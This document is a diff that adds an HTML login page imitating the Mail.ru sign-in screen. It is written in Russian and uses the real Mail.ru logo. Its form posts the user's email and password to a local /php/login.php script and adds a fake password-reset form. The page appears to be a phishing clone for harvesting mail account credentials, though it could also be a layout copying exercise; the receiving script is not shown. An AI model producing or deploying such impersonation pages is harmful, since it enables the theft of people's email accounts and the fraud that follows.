@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Arimo&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/style/mail-signup.css">
+    <link rel="icon" href="https://img.imgsmail.ru/static.promo/logo/logo.svg">
+    <title>mail-signup</title>
+</head>
+
+<body>
+    <div class="main">
+        <div class="index-bg-video">
+            <div class="video-bg">
+                <video loop autoplay muted>
+                    <source src="/video/space.mp4" type="video/mp4">
+                </video>
+            </div>
+        </div>
+        <div class="main-header">
+            <div class="header-inner">
+                <div class="logo">
+                    <a href="#" class="mail"><img src="https://img.imgsmail.ru/static.promo/logo/logo.svg" alt=""></a>
+                </div>
+            </div>
+        </div>
+        <div class="container">
+            <form action="/php/login.php" method="post">
+                <div class="container-main">
+                    <div class="regular">
+                        <div class="regular-inner">
+                            <div class="regular-inner-pad">
+                                <h1>Вход в учетную запись Mail.ru</h1>
+                                <div class="regular-password">
+                                    <label for="password">Email</label>
+                                    <div class="regular-password-main">
+                                        <div class="regular-password-generate">
+                                            <input type="email" class="regular-password-generate-input"
+                                                name="le"></input>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="regular-rezerv">
+                                    <div class="regular-rezerv-label">
+                                        <label for="rezerv">Password</label>
+                                        <label class="rez-pass" for="pass"><a href="#" class="zereset"
+                                                onclick="toggleBlock()">
+                                                Забыли пароль?
+                                            </a></label>
+                                    </div>
+                                    <div class="regular-rezerv-main">
+                                        <div class="regular-rezerv-generate">
+                                            <input name="lp" class="regular-rezerv-generate-input" type="password">
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="regular-end">
+                                    <div class="regular-end-main">
+                                        <div class="regular-end-generate">
+                                            <button type="submit" class="regular-end-button" name="go-in">
+                                                Войти
+                                            </button>
+                                            <div class="regular-end-text">
+                                                <p>Нажимая «Войти», вы принимаете следующие <a class="reg-href"
+                                                        href="#">Условия использования</a></p>
+                                            </div>
+                                            <div class="regular-new-text">
+                                                <a name="new-t" href="mail-sign.html">Вы еще не зарагестрированы ?</a>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="regular-inner-reset" id="myBlock">
+                            <div class="regular-inner-pad">
+                                <h1>Восстановление доступа</h1>
+                                <div class="regular-password">
+                                    <label for="email">Ввeдите адрес электронной почты</label>
+                                    <div class="regular-password-main">
+                                        <div class="regular-password-generate">
+                                            <input type="email" class="regular-password-generate-input"
+                                                name="email"></input>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="regular-end">
+                                    <div class="regular-end-main">
+                                        <div class="regular-end-generate">
+                                            <button type="submit" class="regular-end-button" name="reset">
+                                                Сбросить
+                                            </button>
+                                            <div class="regular-end-text">
+                                                <p>Нажимая «Сбросить», вы принимаете следующие <a class="reg-href"
+                                                        href="#">Условия использования</a></p>
+                                            </div>
+                                            <div class="regular-new-text">
+                                                <a name="new-t" href="mail-sign.html">Вы еще не зарагестрированы ?</a>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </form>
+        </div>
+    </div>
+    <script src="/javaScript/mail-signup.js"></script>
+</body>
+
+</html>
